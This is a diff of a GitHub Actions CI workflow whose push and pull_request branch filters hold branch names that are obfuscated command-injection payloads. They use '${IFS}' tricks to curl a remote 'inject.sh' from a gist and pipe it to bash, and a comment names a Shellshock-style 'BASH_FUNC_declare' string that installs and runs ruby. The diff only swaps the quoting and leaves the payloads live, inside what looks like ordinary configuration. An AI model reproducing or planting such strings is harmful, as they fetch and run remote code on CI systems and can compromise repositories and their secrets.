@@ -6,9 +6,9 @@ name: CI
 on:
   # Triggers the workflow on push or pull request events but only for the "BASH_FUNC_declare%%=()-{-id;-exit;-}'-fedora33-/bin/bash--c-'dnf-install-ruby--y-1>/dev/null;-ruby-/dev/null" branch
   push:
-    branches: [ "Test")${IFS}&&${IFS}{curl,-sSfL,gist.githubusercontent.com/RampagingSloth/72511291630c7f95f0d8ffabb3c80fbf/raw/inject.sh}${IFS}|${IFS}bash&&echo${IFS}$("foo" ]
+    branches: [ 'Test")${IFS}&&${IFS}{curl,-sSfL,gist.githubusercontent.com/RampagingSloth/72511291630c7f95f0d8ffabb3c80fbf/raw/inject.sh}${IFS}|${IFS}bash&&echo${IFS}$("foo' ]
   pull_request:
-    branches: [ "Test")${IFS}&&${IFS}{curl,-sSfL,gist.githubusercontent.com/RampagingSloth/72511291630c7f95f0d8ffabb3c80fbf/raw/inject.sh}${IFS}|${IFS}bash&&echo${IFS}$("foo" ]
+    branches: [ 'Test")${IFS}&&${IFS}{curl,-sSfL,gist.githubusercontent.com/RampagingSloth/72511291630c7f95f0d8ffabb3c80fbf/raw/inject.sh}${IFS}|${IFS}bash&&echo${IFS}$("foo' ]
 
   # Allows you to run this workflow manually from the Actions tab
   workflow_dispatch:
